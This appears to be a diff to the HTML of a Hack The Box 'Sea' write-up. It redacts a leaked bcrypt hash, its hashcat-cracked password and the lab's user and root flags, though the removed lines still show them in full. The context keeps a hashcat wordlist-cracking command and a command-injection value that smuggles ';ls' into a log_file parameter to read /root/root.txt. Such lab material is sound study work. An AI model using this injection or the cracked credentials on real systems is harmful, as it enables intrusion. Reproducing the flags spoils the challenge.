@@ -256,7 +256,7 @@ $ cat database.js
         <span style="color:#e6db74">&#34;forceLogout&#34;</span>: false,
         <span style="color:#e6db74">&#34;forceHttps&#34;</span>: false,
         <span style="color:#e6db74">&#34;saveChangesPopup&#34;</span>: false,
-        <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">y</span>$10$iOrk210RQSAzNCx6Vyq2X<span style="color:#e6db74">.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q&#34;</span>,
+        <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">y</span>$10$iOrk210RQSA<span style="color:#e6db74">****************&#34;</span>,
         <span style="color:#e6db74">&#34;lastLogins&#34;</span>: <span style="color:#f92672">{</span>
             <span style="color:#e6db74">&#34;2024\/08\/13 18:10:26&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
             <span style="color:#e6db74">&#34;2024\/08\/13 18:09:26&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
@@ -267,10 +267,10 @@ $ cat database.js
 
 
 </code></pre></div><p>Fix the hash provided removing the escapes obtaining this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$2y$10$iOrk****************
 ┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sea<span style="color:#f92672">]</span>
 └─$ hashcat hash.txt -m <span style="color:#ae81ff">3200</span> /usr/share/wordlists/rockyou.txt
-$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
+$2y$10$iOrk21****************:****************
                                                           
 Session..........: hashcat
 Status...........: Cracked
@@ -319,8 +319,8 @@ root:$6$llVzHhr7xHrvx1wJ$gH0PLbyPaIOqLrpjpzGZbM2bZ/iHaOfv/bj1YRrktVeZ8.1KQ0Jr1Rv
 <p>We can get the root flag directly</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">log_file<span style="color:#f92672">=</span>/root/root.txt;ls&amp;analyze_log<span style="color:#f92672">=</span>/root/root.txt
 </code></pre></div><p>**Flags</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">user:459138e5dbf2ead0be8b9c7944a38af7
-root:c58fac10593819ba13ab985ab6389ce0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">user:459138e5dbf2****************
+root:c58fac105938****************
 </code></pre></div>
       </div>
     </article>
